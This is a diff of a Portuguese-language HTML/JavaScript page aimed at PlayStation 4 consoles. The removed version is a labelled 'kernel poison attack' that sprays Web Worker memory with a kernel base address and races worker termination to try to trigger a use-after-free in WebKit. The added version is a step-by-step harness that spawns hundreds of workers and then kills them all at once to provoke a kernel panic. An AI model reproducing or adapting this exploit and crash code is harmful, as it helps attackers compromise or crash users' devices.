@@ -2,112 +2,113 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Kernel Pointer Poisoning</title>
+<title>Iso-Diagnostic: Pthread Panic</title>
 <style>
-    body { background: #000; color: #ff3333; font-family: monospace; padding: 20px; }
-    button { width: 100%; padding: 20px; background: #222; border: 2px solid #f00; color: #fff; font-weight: bold; font-size: 18px; cursor: pointer; }
-    #log { margin-top: 20px; border: 1px solid #333; height: 300px; overflow: auto; white-space: pre-wrap; }
+    body { background: #111; color: #fff; font-family: sans-serif; padding: 20px; }
+    .panel { display: flex; flex-direction: column; gap: 10px; max-width: 600px; }
+    button { padding: 15px; font-size: 16px; cursor: pointer; font-weight: bold; border: none; }
+    
+    .btn-fill { background: #d4ac0d; color: #000; } /* Amarelo */
+    .btn-ping { background: #2e86c1; color: #fff; } /* Azul */
+    .btn-kill { background: #c0392b; color: #fff; } /* Vermelho */
+    
+    #log { margin-top: 20px; background: #000; border: 1px solid #444; height: 300px; overflow-y: scroll; padding: 10px; font-family: monospace; color: #0f0; }
 </style>
 </head>
 <body>
 
-<h1>KERNEL POISON ATTACK</h1>
-<p>Target: 0xffffffff82200000 (Kernel Base)</p>
-<p>Strategy: UAF + Heap Spray com Ponteiro de Kernel</p>
-<hr>
+<h1>DIAGNÓSTICO DE KERNEL PANIC</h1>
+<p>Vamos descobrir o gatilho exato.</p>
 
-<button onclick="startPoisoning()">INJETAR PONTEIROS MALICIOSOS (RACE)</button>
+<div class="panel">
+    <button class="btn-fill" onclick="step1_Fill()">PASSO 1: Encher Memória (Fill)</button>
+    <button class="btn-ping" onclick="step2_Ping()">PASSO 2: Estressar Comunicação (Ping)</button>
+    <button class="btn-kill" onclick="step3_Kill()">PASSO 3: Matar Todos (Purge)</button>
+    <br>
+    <button onclick="resetTest()">Resetar Teste</button>
+</div>
 
-<div id="log">Sistema pronto.</div>
+<div id="log">Console pronto. Aguardando comandos...</div>
 
 <script>
+    let workers = [];
+    const blobUrl = URL.createObjectURL(new Blob([`
+        onmessage = function(e) {
+            // Apenas responde para confirmar vida
+            if(e.data === 'ping') postMessage('pong');
+            // Aloca um pouco de pilha
+            let x = new Uint8Array(1024);
+        }
+    `], {type: 'application/javascript'}));
+
     function log(msg) {
-        document.getElementById('log').innerText += `\n[+] ${msg}`;
+        const l = document.getElementById('log');
+        l.innerText += "\n> " + msg;
+        l.scrollTop = l.scrollHeight;
     }
 
-    // Endereço do Kernel fornecido por você
-    // 0xffffffff82200000 em Little Endian (padrão x86_64/PS4)
-    // Low: 0x82200000, High: 0xffffffff
-    const KERNEL_POINTER_LOW = 0x82200000;
-    const KERNEL_POINTER_HIGH = 0xffffffff;
-
-    const workerCode = `
-        onmessage = function(e) {
-            const cmd = e.data;
-            
-            if(cmd.type === 'spray') {
-                // Cria um array de Buffers preenchidos com o endereço do Kernel
-                // Isso cria "minas terrestres" na memória RAM
-                const spray = [];
-                for(let i=0; i < 200; i++) {
-                    // 4KB por bloco
-                    const buf = new Uint32Array(1024); 
-                    for(let j=0; j < buf.length; j+=2) {
-                        buf[j] = ${KERNEL_POINTER_LOW};   // Parte baixa
-                        buf[j+1] = ${KERNEL_POINTER_HIGH}; // Parte alta
-                    }
-                    spray.push(buf);
-                }
-                
-                // Mantém ocupado para aumentar a janela de corrida
-                postMessage('sprayed');
-            }
-        }
-    `;
-
-    const blobUrl = URL.createObjectURL(new Blob([workerCode], {type: 'application/javascript'}));
-
-    function startPoisoning() {
-        log("Iniciando injeção de endereços de Kernel...");
+    // PASSO 1: Descobrir o limite exato sem matar
+    function step1_Fill() {
+        log("Iniciando Alocação (Spawn)...");
+        let count = 0;
         
-        let workers = [];
-        let running = true;
-
-        // Loop de Race Condition
-        function race() {
-            if(!running) return;
-
-            // 1. Cria Workers (Aloca memória)
-            const w = new Worker(blobUrl);
-            workers.push(w);
-
-            // 2. Manda eles encherem a memória com o endereço do Kernel
-            w.postMessage({type: 'spray'});
-
-            // 3. O Pulo do Gato: Terminate vs Message
-            // Tentamos fechar o worker EXATAMENTE enquanto ele está escrevendo na memória.
-            // Se o WebKit limpar a estrutura do worker mas o processo de escrita continuar
-            // por milissegundos, ele pode corromper uma vtable vizinha com o endereço do Kernel.
-            setTimeout(() => {
-                w.terminate();
-                
-                // Tenta limpar referências para forçar Garbage Collection imediato
-                workers.shift(); 
-                
-                // Spray na thread principal também para garantir saturação
-                fillMainThreadHeap();
-            }, 5); // Janela de tempo ajustada
-
-            requestAnimationFrame(race);
-        }
-
-        // Função auxiliar para sujar a memória da thread principal
-        function fillMainThreadHeap() {
+        // Tenta criar um por vez com delay mínimo para não travar a UI do navegador
+        // mas rápido o suficiente para estressar o kernel
+        const interval = setInterval(() => {
             try {
-                const arr = new Uint32Array(1000);
-                for(let i=0; i<arr.length; i+=2) {
-                    arr[i] = KERNEL_POINTER_LOW;
-                    arr[i+1] = KERNEL_POINTER_HIGH;
+                const w = new Worker(blobUrl);
+                workers.push(w);
+                count++;
+                
+                // Feedback visual a cada 50
+                if(count % 50 === 0) log(`Workers ativos: ${count}`);
+                
+                // Limite de segurança do script (o sistema deve falhar antes disso)
+                if(count >= 1000) {
+                    clearInterval(interval);
+                    log("Script parou em 1000 (Limite de segurança).");
                 }
-            } catch(e) {}
-        }
+            } catch(e) {
+                clearInterval(interval);
+                log("ERRO DE ALOCAÇÃO ATINGIDO!");
+                log(`Limite do Sistema: ${count} threads.`);
+                log(`Erro retornado: ${e.message}`);
+                log("SISTEMA ESTÁVEL? Se sim, o crash não é na criação.");
+            }
+        }, 5);
+    }
 
-        // Inicia 4 threads concorrentes de ataque
-        for(let i=0; i<4; i++) race();
+    // PASSO 2: Verificar se manter eles vivos causa o crash
+    function step2_Ping() {
+        if(workers.length === 0) return log("Nenhum worker para pingar.");
+        log(`Enviando mensagens para ${workers.length} threads...`);
         
-        setTimeout(() => {
-            log("Ataque em andamento... Se o console não desligar em 30s, recarregue.");
-        }, 1000);
+        // Broadcast
+        workers.forEach(w => w.postMessage('ping'));
+        log("Mensagens enviadas. Se o console travar agora, o problema é IPC/Scheduler.");
+    }
+
+    // PASSO 3: O Gatilho mais provável (Mass Destruction)
+    function step3_Kill() {
+        if(workers.length === 0) return log("Nada para matar.");
+        log("INICIANDO PURGE (TERMINATE ALL)...");
+        log("Prepare-se para possível Kernel Panic.");
+        
+        // Aqui está a chave: Matamos todos em um loop síncrono apertado
+        // Isso dispara centenas de interrupções de hardware para a CPU
+        const total = workers.length;
+        for(let i=0; i < total; i++) {
+            workers[i].terminate();
+        }
+        workers = []; // Limpa array JS
+        
+        log("Comando enviado. Se você está lendo isso, o console sobreviveu (por enquanto).");
+    }
+
+    function resetTest() {
+        workers.forEach(w => w.terminate());
+        workers = [];
+        log("Reset efetuado.");
     }
 </script>
 
